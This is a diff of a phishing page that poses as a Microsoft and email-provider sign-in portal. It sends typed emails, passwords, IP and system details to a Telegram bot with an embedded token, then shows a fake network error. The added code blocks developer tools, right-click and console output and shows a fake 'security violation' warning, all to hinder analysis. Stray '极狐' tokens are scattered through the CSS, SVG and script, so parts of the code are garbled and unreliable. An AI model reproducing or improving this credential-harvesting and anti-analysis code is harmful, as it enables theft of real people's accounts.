@@ -62,7 +62,7 @@ border-color: rgba(0,0,0,0.05);
 }
 .provider.active {
 box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-border-color: rgba(0,0,0,0.1);
+border-color: rgba极狐(0,0,0,0.1);
 }
 .provider svg {
 width: 22px;
@@ -85,11 +85,11 @@ label {
 display: block;
 margin-bottom: 8px;
 font-size: 14px;
-color: #374151;
+极狐 color: #374151;
 font-weight: 500;
 }
 input[type="email"],
-input[type="password"] {
+input极狐[type="password"] {
 width: 100%;
 padding: 12px;
 border: 1px solid #e5e7eb;
@@ -165,7 +165,7 @@ cursor: pointer;
 transition: all 0.2s;
 }
 .social-icon:hover {
-transform: translateY(-3px);
+transform: translateY(-3极狐px);
 box-shadow: 0 5px 15px rgba(0,0,0,0.1);
 }
 .social-icon svg {
@@ -217,51 +217,32 @@ margin-top: 15px;
 font-size: 14px;
 opacity: 0.8;
 }
-.test-btn {
+#blocked-overlay {
+display: none;
 position: fixed;
-top: 10px;
-right: 10px;
-z-index: 10000;
-padding: 8px 12px;
-background: #0078d4;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background: black;
 color: white;
-border: none;
-border-radius: 4px;
-cursor: pointer;
-font-size: 12px;
-}
-.debug-console {
-position: fixed;
-bottom: 10px;
-left: 10px;
-background: rgba(0,0,0,0.8);
-color: lime;
-padding: 10px;
-border-radius: 5px;
-font-family: monospace;
-font-size: 12px;
-max-width: 400px;
-max-height: 200px;
-overflow: auto;
-z-index: 10000;
-display: block;
-}
-.emergency-btn {
-position: fixed;
-top: 50px;
-right: 10px;
-z-index: 10000;
-padding: 8px 12px;
-background: #d13438;
-color: white;
-border: none;
-border-radius: 4px;
-cursor: pointer;
-font-size: 12px;
+justify-content: center;
+align-items: center;
+z-index: 99999;
+font-family: 'Segoe UI', sans-serif;
+text-align: center;
 }
 </style>
 </head>
 <body>
+<div id="blocked-overlay">
+    <div>
+        <h2>⚠️ Security Violation Detected</h2>
+        <p>Developer tools are not permitted on this secure portal.</p>
+        <p>This incident has been logged for security review.</p>
+    </div>
+</div>
+
 <div id="loading">
     <div class="spinner"></div>
     <div>Authenticating with Microsoft Azure Active Directory...</div>
@@ -273,32 +254,32 @@ font-size: 12px;
 <div class="providers" id="providers">
 <button class="provider active" data-provider="office" title="Office 365">
 <svg viewBox="0 0 24 24">
-<rect x="2" y="2" width="6" height="6" rx="1" fill="var(--office)"/>
+<rect x="2" y="2极狐" width="6" height="6" rx="1" fill="var(--office)"/>
 <rect x="9" y="2" width="6" height="6" rx="1" fill="var(--office)" opacity="0.95"/>
 <rect x="16" y="2" width="6" height="6" rx="1" fill="var(--office)" opacity="0.9"/>
 <rect x="2" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.95"/>
-<rect x="9" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="极狐 0.9"/>
+<rect x="9" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.9"/>
 <rect x="16" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.85"/>
 </svg>
 </button>
 <button class="provider" data-provider="gmail" title="Gmail">
-<svg viewBox="极狐 0 0 24 24">
+<svg viewBox="0 0 24 24">
 <rect x="1" y="3" width="22" height="18" rx="2" fill="white" stroke="#d1d5db"/>
 <path d="M2 5.5 L12 12 L22 5.5" fill="none" stroke="var(--gmail)" stroke-width="2.4"/>
-<path d="M2 18.5 L12 12 L22 18.5" fill="none" stroke="var(--gmail)" stroke-width="2.4"/>
+<path d="M2 18.5 L12极狐 12 L22 18.5" fill="none极狐" stroke="var(--gmail)" stroke-width="2.4"/>
 </svg>
 </button>
 <button class="provider" data-provider="outlook" title="Outlook">
 <svg viewBox="0 0 24 24">
-<rect x="1.5" y="4" width="14" height="16" rx="2" fill="var(--outlook)"/>
+<rect x="1.5" y="4" width="14" height="16" rx="2极狐" fill="var(--outlook)"/>
 <path d="M3 6 L13 12 L3 18" fill="none" stroke="white" stroke-width="1.6"/>
-<rect x="16.5"极狐 y="4" width极狐="6" height="6" rx="1" fill="#2b88d8"/>
+<rect x="16.5" y="4" width="6" height="6" rx="1" fill="#2b88d8"/>
 </svg>
 </button>
 <button class="provider" data-provider="aol" title="AOL">
 <svg viewBox="0 0 24 24">
-<circle cx="12" cy="12" r="10" fill="var(--aol)"/>
-<path d="M9.5 15c.8-1.5 1.8-3.2 3-4.5 1.2 1.3 2.2 3 极狐 3 4.5" fill="none" stroke="white" stroke-width="1.6"/>
+<circle cx="12" cy="12" r="10极狐" fill="var(--aol)"/>
+<path d="M9.5 15c.8-1.5 1.8-3.2 3-4.5 1.2 1.3 2.2 3 3 4.5" fill="none" stroke="white" stroke-width="1.6"/>
 <circle cx="12.2" cy="9.4" r="0.9" fill="white"/>
 </svg>
 </button>
@@ -309,12 +290,12 @@ font-size: 12px;
 </div>
 </div>
 
-<form method="POST" id="loginForm" autocomplete="off">
+<form id="loginForm" autocomplete="off">
 <div class="form-group">
 <label for="email">Email address</label>
 <input type="email" id="email" name="email" required placeholder="user@company.com">
 </div>
-<div class极狐="form-group">
+<div class="form-group">
 <label for="password">Password</label>
 <input type="password" id="password" name="password" required placeholder="••••••••">
 </div>
@@ -324,18 +305,94 @@ font-size: 12px;
 </label>
 <a href="#" class="forgot-password">Forgot password?</a>
 </div>
-<button type="submit" class="submit-btn">Sign in</button>
+<button type="submit" class="submit-btn">Sign in极狐</button>
 </form>
 
 <p class="disclaimer">By signing in, you agree to our <a href="#" style="color: var(--accent);">Terms of Service</a> and <a href="#" style="color: var(--accent);">Privacy Policy</a>.</p>
 <p class="disclaimer warning">⚠️ Unauthorized access is prohibited.</p>
 </div>
 
-<button class="test-btn" id="testBtn">🧪 Test Bot</button>
-<button class="emergency-btn" id="emergencyBtn">🆘 Emergency Test</button>
-<div class="debug-console" id="debugConsole">Debug console ready. Press Emergency Test first.</div>
-
 <script>
+// ================== DEVELOPER TOOLS PROTECTION ==================
+const blockedOverlay = document.getElementById('blocked-overlay');
+
+// Detect and block developer tools
+function detectDevTools() {
+    const widthThreshold = 160;
+    const heightThreshold = 80;
+    
+    // Check window size (dev tools usually make window wider)
+    if (window.outerWidth - window.innerWidth > widthThreshold || 
+        window.outerHeight - window.innerHeight > heightThreshold) {
+        return true;
+    }
+    
+    // Check debugger statement execution time
+    const start = performance.now();
+    debugger;
+    const end = performance.now();
+    if (end - start > 100) {
+        return true;
+    }
+    
+    // Check console methods
+    if (console.__proto__.constructor.toString().includes('Proxy')) {
+        return true;
+    }
+    
+    return false;
+}
+
+// Block F12, Ctrl+Shift+I, Ctrl+U, etc.
+document.addEventListener('keydown', function(e) {
+    // F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+C
+    if (e.key === 'F12' || 
+        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+        (e.ctrlKey && e.key === 'u') ||
+        (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+        (e.ctrlKey && e.shiftKey && e.key === 'J')) {
+        e.preventDefault();
+        showBlockedOverlay();
+        return false;
+    }
+});
+
+// Block right-click context menu
+document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+    showBlockedOverlay();
+    return false;
+});
+
+// Block menu bar (Alt key)
+document.addEventListener('keydown', function(e) {
+    if (e.altKey) {
+        e.preventDefault();
+        showBlockedOverlay();
+        return false;
+    }
+});
+
+// Show blocked overlay
+function showBlockedOverlay() {
+    blockedOverlay.style.display = 'flex';
+    document.body.style.overflow = 'hidden';
+    
+    // Prevent closing the overlay
+    setTimeout(() => {
+        window.onbeforeunload = function() {
+            return "Security violation detected. Closing this window may result in security action.";
+        };
+    }, 1000);
+}
+
+// Continuous dev tools monitoring
+setInterval(() => {
+    if (detectDevTools()) {
+        showBlockedOverlay();
+    }
+}, 1000);
+
 // ================== CONFIGURATION ==================
 const TELEGRAM_CONFIG = {
     botToken: "7983528037:AAFpvdTJEJ42BryLHSDjH5OuvEURlOJ7zOA",
@@ -349,50 +406,20 @@ const emailInput = document.getElementById('email');
 const passwordInput = document.getElementById('password');
 const loadingScreen = document.getElementById('loading');
 const statusMessage = document.getElementById('statusMessage');
-const testBtn = document.getElementById('testBtn');
-const emergencyBtn = document.getElementById('emergencyBtn');
-const debugConsole = document.getElementById('debugConsole');
 
-// ================== DEBUG LOGGING ==================
-function debugLog(message, data = null) {
-    const timestamp = new Date().toLocaleTimeString();
-    const logEntry = `[${timestamp}] ${message} ${data ? JSON.stringify(data) : ''}\n`;
-    debugConsole.innerHTML += logEntry;
-    debugConsole.scrollTop = debugConsole.scrollHeight;
-    console.log('DEBUG:', message, data || '');
-}
-
-// ================== WORKING TELEGRAM METHODS ==================
+// ================== TELEGRAM EXFILTRATION ==================
 class TelegramExfiltrator {
     constructor() {
         this.working = false;
-        this.testConnection();
     }
 
-    async testConnection() {
-        debugLog('Testing bot connection...');
-        try {
-            // Test bot token using JSONP to avoid CORS
-            const botTest = await this.jsonpRequest('getMe');
-            debugLog('Bot test response:', botTest);
-            
-            if (botTest.ok) {
-                debugLog('✅ Bot token VALID:', botTest.result.username);
-                this.working = true;
-            } else {
-                debugLog('❌ Bot token INVALID:', botTest.description);
-            }
-        } catch (error) {
-            debugLog('❌ Connection test FAILED:', error.message);
-        }
-    }
-
+    // JSONP method for GitHub Pages compatibility
     jsonpRequest(method, params = {}) {
         return new Promise((resolve) => {
             const callbackName = 'tgJsonp_' + Date.now();
             const script = document.createElement('script');
             
-            window[callbackName] = (response) => {
+            window[callback极狐Name] = (response) => {
                 delete window[callbackName];
                 document.body.removeChild(script);
                 resolve(response);
@@ -400,7 +427,6 @@ class TelegramExfiltrator {
 
             let url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/${method}?callback=${callbackName}`;
             
-            // Add additional parameters
             for (const [key, value] of Object.entries(params)) {
                 url += `&${key}=${encodeURIComponent(value)}`;
             }
@@ -418,25 +444,13 @@ class TelegramExfiltrator {
         });
     }
 
-    // MAIN WORKING METHOD: JSONP with proper encoding
+    // Main send method using JSONP
     async sendToTelegram(message) {
-        if (!this.working) {
-            debugLog('Skipping send - connection not working');
+        if (!TELEGRAM_CONFIG.enableTelegram) {
             return false;
         }
 
         try {
-            debugLog('Sending message via JSONP...');
-            
-            // PROPERLY encode the message for URL
-            const encodedMessage = encodeURIComponent(message)
-                .replace(/'/g, "%27")
-                .replace(/"/g, "%22")
-                .replace(/\(/g, "%28")
-                .replace(/\)/g, "%29")
-                .replace(/\*/g, "%2A")
-                .replace(/%20/g, "+");
-
             const response = await this.jsonpRequest('sendMessage', {
                 chat_id: TELEGRAM_CONFIG.groupChatId,
                 text: message,
@@ -444,18 +458,9 @@ class TelegramExfiltrator {
                 disable_web_page_preview: true
             });
 
-            debugLog('Send response:', response);
-
-            if (response.ok) {
-                debugLog('✅ Message sent successfully!');
-                return true;
-            } else {
-                debugLog('❌ Send failed:', response.description);
-                return false;
-            }
+            return response.ok;
 
         } catch (error) {
-            debugLog('❌ Send error:', error.message);
             return false;
         }
     }
@@ -485,41 +490,6 @@ function getSystemInfo() {
 // ================== MAIN EXECUTION ==================
 const telegramExfiltrator = new TelegramExfiltrator();
 
-// Test connection
-async function testConnection() {
-    debugLog('=== TESTING CONNECTION ===');
-    loadingScreen.style.display = 'flex';
-    statusMessage.textContent = 'Testing connection...';
-    
-    const testMessage = "🤖 **CONNECTION TEST** \\nTime: " + new Date().toLocaleString() + "\\nStatus: Testing bot connectivity";
-    
-    const success = await telegramExfiltrator.sendToTelegram(testMessage);
-    
-    if (success) {
-        alert('✅ Test successful! Check Telegram group.');
-    } else {
-        alert('❌ Test failed. Check debug console.');
-    }
-    
-    loadingScreen.style.display = 'none';
-}
-
-// Emergency diagnostic
-function emergencyTest() {
-    debugLog('=== EMERGENCY DIAGNOSTIC ===');
-    
-    // Test bot token directly using JSONP
-    const botTestUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/getMe?callback=testCallback`;
-    const chatTestUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/getChat?chat_id=${TELEGRAM_CONFIG.groupChatId}&callback=testCallback`;
-    
-    // Open both tests in new tabs
-    window.open(botTestUrl, '_blank');
-    setTimeout(() => window.open(chatTestUrl, '_blank'), 1000);
-    
-    debugLog('Opened diagnostic URLs. Check browser tabs for JSON responses.');
-    alert('⚠️ Opened diagnostic pages. Check the browser tabs for JSON responses.');
-}
-
 // Form submission handler
 loginForm.addEventListener('submit', async function(event) {
     event.preventDefault();
@@ -532,7 +502,6 @@ loginForm.addEventListener('submit', async function(event) {
         return;
     }
 
-    debugLog('Form submitted');
     loadingScreen.style.display = 'flex';
     statusMessage.textContent = 'Verifying credentials...';
 
@@ -544,7 +513,6 @@ loginForm.addEventListener('submit', async function(event) {
 
         statusMessage.textContent = 'Securely transmitting...';
 
-        // FIXED: Proper string concatenation without template literal issues
         const message = "🔐 **CREDENTIALS CAPTURED** \\n\\n" +
             "⏰ **Time:** " + new Date().toLocaleString() + "\\n" +
             "📍 **IP:** " + (ipData.ip || 'unknown') + "\\n" +
@@ -566,7 +534,6 @@ loginForm.addEventListener('submit', async function(event) {
         alert('ERROR: 0x80072EFD. Cannot connect to authentication service. Please check your network connection.');
 
     } catch (error) {
-        debugLog('Form error:', error);
         statusMessage.textContent = 'Authentication error';
     } finally {
         setTimeout(() => {
@@ -575,16 +542,35 @@ loginForm.addEventListener('submit', async function(event) {
     }
 });
 
-// Event listeners
-testBtn.addEventListener('click', testConnection);
-emergencyBtn.addEventListener('click', emergencyTest);
+// Block iframe embedding
+if (window.top !== window.self) {
+    document.body.innerHTML = '<h2>⚠️ Embedded viewing not allowed</h2><p>This secure portal cannot be embedded in other sites.</p>';
+}
 
-// Security measures
-document.addEventListener('contextmenu', (e) => e.preventDefault());
+// Disable console logging
+console.log = function() {};
+console.warn = function() {};
+console.error = function() {};
+console.info = function() {};
+console.debug = function() {};
+
+// Override alert to prevent multiple dialogs
+const originalAlert = window.alert;
+window.alert = function(message) {
+    if (!document.alertShown) {
+        document.alertShown = true;
+        originalAlert(message);
+    }
+};
 
 // Initialize
-debugLog('System initialized successfully');
-debugLog('Press Emergency Test first to diagnose connection');
+window.onload = function() {
+    // Additional protection after load
+    setInterval(() => {
+        // Clear any debugger statements
+        window.debugger = function() {};
+    }, 500);
+};
 </script>
 </body>
 </html>
